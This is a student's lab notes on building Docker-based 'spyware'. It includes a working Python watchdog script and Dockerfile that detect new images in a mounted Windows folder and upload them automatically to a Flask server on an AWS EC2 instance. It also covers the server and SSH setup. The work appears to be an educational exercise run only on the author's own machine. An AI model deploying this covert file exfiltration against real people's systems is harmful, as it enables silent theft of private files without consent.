# What is Spyware?

Spyware is a type of malicious software designed to secretly monitor and collect information from a system without the user's consent. It can track activities, steal sensitive data, or send collected information to a remote server. Some common types of spyware include:

- **Keyloggers** – Record keystrokes to steal passwords.
- **Screen Scrapers** – Capture screenshots of a user's activity.
- **File Monitors** – Watch specific folders/files and exfiltrate data.
    
### What This Task Expects
This task involves using **Docker** to create a containerized environment that behaves like spyware. The goal is to:

1. **Monitor a folder** for newly added image files (`.png, .jpg, .jpeg`).
2. **Automatically upload** detected images to a remote server.
3. **Run inside a Docker container**, which allows it to operate in an isolated, controlled manner.
4. **Use volume mounting** to allow the container to monitor a folder outside of Docker (on the Windows OS).

This setup mimics how malware could use Docker to bypass security restrictions while operating in a sandboxed environment. However, since this is for research purposes, the goal is to understand how file monitoring and data exfiltration work rather than creating actual malware.

---

# **Docker Folder Monitoring & File Upload**

## **Understanding Folder Mounting in Docker**

When you mount a folder from your **Windows host** into a **Docker container**, the container gets real-time access to the files in that folder. Any changes made in Windows are reflected in Docker, and vice versa.

### **Key Benefits of Mounting**

1. **Shared Access:** Files inside Windows and the container are linked.
    
2. **Persistent Data:** Files are not lost when the container stops.
    
3. **Real-Time Sync:** Any changes in Windows reflect instantly inside Docker.
    

## **Example: Mounting a Windows Folder into Docker**

Run the following command in **PowerShell**:

```sh
# Mounts C:\Users\YourName\monitoring (Windows) to /monitoring (Docker)
docker run -it --rm -v C:\Users\YourName\monitoring:/monitoring python
```

### **How This Works:**

- `C:\Users\YourName\monitoring` → **Windows folder to monitor**
    
- `/monitoring` → **Docker container path**
    
- Any new files added to the Windows folder appear inside Docker.
    

---

## **Python Script for Monitoring a Folder**

This script watches a folder for new images and uploads them to a server.

```python
import os
import time
import requests
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

WATCH_FOLDER = "/monitoring"  # Path inside the container
UPLOAD_URL = "http://192.168.1.100:5000/upload"  # Local Windows server

class ImageHandler(FileSystemEventHandler):
    def on_created(self, event):
        if event.is_directory:
            return
        
        file_path = event.src_path
        if file_path.lower().endswith((".png", ".jpg", ".jpeg")):
            print(f"New image detected: {file_path}")
            upload_image(file_path)

def upload_image(file_path):
    with open(file_path, "rb") as file:
        response = requests.post(UPLOAD_URL, files={"file": file})
        print(f"Uploaded {file_path}: {response.text}")

if __name__ == "__main__":
    event_handler = ImageHandler()
    observer = Observer()
    observer.schedule(event_handler, WATCH_FOLDER, recursive=False)
    observer.start()

    print(f"Monitoring folder: {WATCH_FOLDER}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
```

### **How the Script Works:**

1. Watches the **mounted folder** (`/monitoring`) for new images.
    
2. Detects any `.png`, `.jpg`, or `.jpeg` files.
    
3. Uploads the detected images to a **local server** (`UPLOAD_URL`).
    

---

## **Setting Up a Simple Flask Server for Testing**

To receive files, run this **Flask** server on your Windows machine:

```python
from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_FOLDER = "C:/Users/YourName/uploads"  # Windows folder to save images
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return "No file found", 400
    
    file = request.files["file"]
    save_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(save_path)
    return f"File saved at {save_path}", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

### **Running the Server:**

```sh
python server.py  # Run this on Windows
```

---

## **Final Steps: Running Everything in Docker**

### **1. Create a Dockerfile**

```dockerfile
FROM python:3.9
WORKDIR /app
COPY script.py .
RUN pip install requests watchdog
CMD ["python", "script.py"]
```

### **2. Build & Run the Docker Container**

```sh
# Build the Docker image
docker build -t folder-monitor .

# Run the container and mount the Windows folder
docker run -it --rm -v C:\Users\YourName\monitoring:/monitoring folder-monitor
```

### **3. Test the Setup**

- Add an image to `C:\Users\YourName\monitoring`
    
- The image should automatically **upload** to `C:\Users\YourName\uploads`
    
- Check Flask server logs to confirm the upload.
    

---

## **Conclusion**

By using **Docker bind mounts**, we allow a container to monitor a **Windows folder** and upload new images to a **local server**. This setup ensures **real-time folder monitoring and automatic file uploads**.

✅ **Now, any image added to Windows gets detected inside Docker and uploaded to the server!** 🚀



To SSH into the EC2 instance, do this putty configuration:
![[Pasted image 20250330010414.png]]




IN WSL:

i did, to copy pem file from windows to wsl:

```bash
cp "/mnt/d/code to pem file" ~/.ssh/
```

then do: 
```bash
chmod 400 ~/.ssh/main-key2.pem
```
What it does:

chmod changes file permissions.

400 sets the file to be readable only by the owner (you) and removes write/execute permissions for everyone else.

This is required because SSH private keys must have restricted permissions, or SSH will refuse to use them for security reasons.


### Now, for connecting to SSH,
```bash
ssh -i ~/.ssh/main-key2.pem ubuntu@your-ec2-public-ip
```

I AM INNNNN!!!!!!!!
now, the commands i ran are:

```bash
sudo apt update
sudo apt install -y python3 python3-pip

sudo su root
apt install python3-flask

mkdir ~/upload-server && cd ~/upload-server
nano server.py

```

server.py :
```python
from flask import Flask, request
import os

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return "No file part", 400
    file = request.files["file"]
    if file.filename == "":
        return "No selected file", 400
    file_path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(file_path)
    return f"File {file.filename} uploaded successfully", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

```


```bash
mkdir templates
nano templates/index.html -- enter some random html details
```

```bash
sudo chown -R $USER:$USER /root/upload-server/
// to allow user to access files

python3 server.py
```

Now , python server will be running.



## Spyware file:

```python
import os
import time
import requests
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

WATCH_FOLDER = "C:/Users/gsuma/OneDrive/Desktop/imgs"  # Folder to monitor

UPLOAD_URL = "http://<public_ip of ec2>:5000/upload"

os.makedirs(WATCH_FOLDER, exist_ok=True)  
# event handler is to detect new files in the folder
class ImageHandler(FileSystemEventHandler): # this is inheriting from FSEH
    def on_created(self, event):
         # ignore directories, only process files
        if event.is_directory:
            return
        file_path = event.src_path

        # check if the file is an image
        if file_path.lower().endswith((".png", ".jpg", ".jpeg")):
            print(f"new image detcted: {file_path}")
            upload_image(file_path)

# funtion to upload the deteced image to the servr
def upload_image(file_path):
    with open(file_path, "rb") as file:
        response = requests.post(UPLOAD_URL, files={"file": file})
        print(f"uploded {file_path}: {response.text}")

if __name__ == "__main__":
    # set up the obsever to monitor the folder
    event_handler = ImageHandler()
    observer = Observer()
    #Creates an observer that watches for changes in the folder.
    observer.schedule(event_handler, WATCH_FOLDER, recursive=False)
    #recursive=False means it won't check inside subfolders, only the main folder.'
    # on_created will run everytime a change occurs
    observer.start()
    print(f"monitoring folder: {WATCH_FOLDER}")
    try:
        while True:
            time.sleep(1)  # keep the script runing
    except KeyboardInterrupt:
        observer.stop()  # stop monitooring when interupted
    observer.join()  # wait for the obsever to clean up
  

'''

he Observer runs in a separate background thread, continuously
monitoring the folder.

Meanwhile, the while True: loop keeps the main thread alive.

When a file is created, watchdog triggers on_created() in the background
without blocking the main loop.

'''
```

dockerfile:
```dockerfile
FROM python:3.10  

WORKDIR /app  

# Copy all files from the current directory (on host) to /app (inside the container)

COPY . .  

# Install necessary Python packages inside the container
RUN pip install requests watchdog  

# Define the command to run the spyware script when the container starts
CMD ["python", "spyware.py"]
```


Command to build image:

```bash
docker build -t spyware-py .
```

Tocontainer:

```bash
docker run --name <container_name> -v /mnt/c/Users/gsuma/OneDrive/Desktop/imgs:/app/imgs spyware-py
```

This command **creates and runs** a new Docker container from the `spyware-py` image, while **mounting** your Windows folder (`C:/Users/gsuma/OneDrive/Desktop/imgs`) into the container at `/app/imgs`. This allows your `spyware.py` script (running inside the container) to detect and upload new images added to the folder on your Windows machine.


Then after the folders linking takes place and i ran the above command, i tried to put images in my imgs folder in windows, which the docker container spyware.py actually uploaded to the AWS EC2 server, and i could view it live as well. it worked out well!







